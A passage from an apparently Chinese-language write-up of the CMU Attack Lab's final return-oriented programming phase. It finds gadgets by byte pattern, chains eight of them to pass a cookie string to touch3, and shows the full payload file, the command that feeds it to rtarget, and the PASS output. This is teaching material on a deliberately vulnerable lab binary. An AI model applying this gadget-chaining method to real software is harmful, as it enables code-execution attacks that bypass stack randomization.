>- 你需要查看`movl`指令对寄存器的高4位字节的影响。
>- 官方解决方案需要八个`gadget`（并非全部都是唯一的）。
>
>Good luck and have fun!

目的与`level 3`相同，即传参为`cookie`值对应的字符串，区别是此时需要进行ROP攻击。

回忆我们在`level 3`中编写的代码：

```assembly
mov    $0x5561dca8,%rdi    # string
push   $0x4018fa           # touch3
ret
```

思路是先将`cookie`字符串的地址传入`%rdi`，再跳转到`touch3`地址即可。

---

但此时栈地址是随机化的，导致我们无法直接获取字符串的地址。根据`level 4`的经验，我们需要从`gadget farm`中找到一个能将`%rsp`传出来的`gadget`。

![图3A](https://i0.hdslb.com/bfs/album/8423a14b10acd90c54410f40765cb128cd5e16aa.png)

观察上图，并寻找含有`48 89 e0`～`48 89 e7`的语句：

```assembly
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq
```

此处的`48 89 e0 c3`对应：

```assembly
movq    %rsp,%rax
ret
```

地址为`401a03+3=401a06`。

---

现在找到了一个`gadget`取出`%rsp`的值到`%rax`，但是还需要加上偏移量才是真正的字符串的地址，最终还需要把这两部分相加（起始地址+偏移量）赋给`%rdi`。

观察`gadget farm`可以发现，有一个与众不同的`gadget`：

```assembly
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq
```

它正可以实现将`%rdi`和`%rsi`两个寄存器的值相加赋给`%rax`，地址为`4019d6`。

---

发现这个`gadget`后，我们的思路更加清晰了：

- 方案一：
  - 首先利用`level 4`的方法，将偏移量弹出至`%rax`，再用`4019a2`将`%rax`赋给`%rdi`；
  - 其次用`401a06`将`%rsp`（起始地址）赋给`%rax`，再将`%rax`赋给`%rsi`（可能多次）；
  - 最后用`4019d6`将`%rdi`和`%rsi`相加赋给`%rax`，再用`4019a2`将`%rax`赋给`%rdi`。
- 方案二：
  - 首先利用`level 4`的方法，将偏移量弹出至`%rax`，再将`%rax`赋给`%rsi`（可能多次）；
  - 其次用`401a06`将`%rsp`（起始地址）赋给`%rax`，再用`4019a2`将`%rax`赋给`%rdi`；
  - 最后用`4019d6`将`%rdi`和`%rsi`相加赋给`%rax`，再用`4019a2`将`%rax`赋给`%rdi`。

总之，现在需要一种（或多种组合）将`%rax`赋给`%rsi`的`gadget`。

---

![图3A](https://i0.hdslb.com/bfs/album/8423a14b10acd90c54410f40765cb128cd5e16aa.png)

![图3C](https://i0.hdslb.com/bfs/album/3d334cf166a1477390d28ce80f77047ca6928990.png)

![图3D](https://i0.hdslb.com/bfs/album/01b778268e681e890c6b2dc950c8883df2bb3a16.png)

观察以上三图，寻找含有`89 c6`（`%eax`->`%esi`）的语句，遗憾的是并没有。

再寻找含有`89 c0`～`89 c7`（`%eax`->）的语句：

- 已知的`4019a2`可以将`%rax`赋给`%rdi`；

  - 再寻找含有`89 f8`～`89 ff`（`%edi`->）的语句，遗憾的是并没有。

- `getval_481`：（`%eax`->`%edx`）

  ```assembly
  00000000004019db <getval_481>:
    4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
    4019e0:	c3                   	retq
  ```

  此处的`89 c2 90 c3`对应：

  ```assembly
  movl    %eax,%edx
  nop
  ret
  ```

  地址为`4019db+2=4019dd`。

  - 再寻找含有`89 d0`～`89 d7`（`%edx`->）的语句：

    `getval_159`：（`%edx`->`%ecx`）

    ```assembly
    0000000000401a33 <getval_159>:
      401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
      401a38:	c3                   	retq
    ```

    此处的`89 d1 38 c9 c3`对应：

    ```assembly
    movl    %edx,%ecx
    cmpb    %cl,%cl
    ret
    ```

    （`38 c9`可以忽略）地址为`401a33+1=401a34`。

    - 再寻找含有`89 c8`～`89 cf`（`%ecx`->）的语句：

      `addval_436`：（`%ecx`->`%esi`）

      ```assembly
      0000000000401a11 <addval_436>:
        401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
        401a17:	c3                   	retq
      ```

      此处的`89 ce 90 90 c3`对应：

      ```assembly
      movl    %ecx,%esi
      nop
      nop
      ret
      ```

      地址为`401a11+2=401a13`。

综上，找到了`%eax`->`4019dd`->`%edx`->`401a34`->`%ecx`->`401a13`->`%esi`。

---

将得到的各个`gadget`进行总结：

```assembly
popq    %rax              # 4019ab
                          # offset
movl    %eax,%edx         # 4019dd
movl    %edx,%ecx         # 401a34
movl    %ecx,%esi         # 401a13
movq    %rsp,%rax         # 401a06
movq    %rax,%rdi         # 4019a2
lea    (%rdi,%rsi,1),%rax # 4019d6
movq    %rax,%rdi         # 4019a2
                          # address of touch3
                          # string of cookie
```

其中偏移量从`%rsp`读入开始计算，为`4*8=32=0x20`，`touch3`的地址为`4018fa`，`cookie`值对应的字符串的十六进制表示为`35 39 62 39 39 37 66 61 00`。

---

编辑用于攻击的字符串文件`exploit.txt`（**注意注释周围的空格**）：

```shell
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00 /* popq    %rax */
20 00 00 00 00 00 00 00 /* offset */
dd 19 40 00 00 00 00 00 /* movl    %eax,%edx */
34 1a 40 00 00 00 00 00 /* movl    %edx,%ecx */
13 1a 40 00 00 00 00 00 /* movl    %ecx,%esi */
06 1a 40 00 00 00 00 00 /* movq    %rsp,%rax */
a2 19 40 00 00 00 00 00 /* movq    %rax,%rdi */
d6 19 40 00 00 00 00 00 /* lea    (%rdi,%rsi,1),%rax */
a2 19 40 00 00 00 00 00 /* movq    %rax,%rdi */
fa 18 40 00 00 00 00 00 /* address of touch3 */
35 39 62 39 39 37 66 61 00 /* string of cookie */
```

再将保存的`exploit.txt`输入到`rtarget`：

```shell
cat exploit.txt | ./hex2raw | ./rtarget -q
```

得到输出如下：

```shell
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 20 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```

完成。
